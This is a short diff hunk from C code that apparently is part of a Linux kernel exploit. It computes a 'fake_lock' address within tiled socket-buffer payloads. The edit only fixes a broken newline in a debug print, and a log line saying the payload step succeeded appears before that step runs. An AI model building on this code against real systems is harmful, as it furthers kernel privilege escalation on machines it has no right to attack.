@@ -820,8 +820,7 @@ uintptr_t prepare_kernel_page(int payload_mode, size_t cand_round) {
     size_t n_tiles = (size_t)SKB_SEND_SIZE / 0x1800;
     size_t k = g_attempt_round % n_tiles;
     fake_lock = base + (k * 0x1800) - 0xe80 + LOCK_OFF;
-    pr_info("[p5] tile %zu/%zu fake_lock=%016zx
-", k, n_tiles, fake_lock);
+    pr_info("[p5] tile %zu/%zu fake_lock=%016zx\n", k, n_tiles, fake_lock);
   }
   pr_info("[p5] prepare_skb_payload returned ok");
   if (!prepare_skb_payload(base, payload_mode)) {
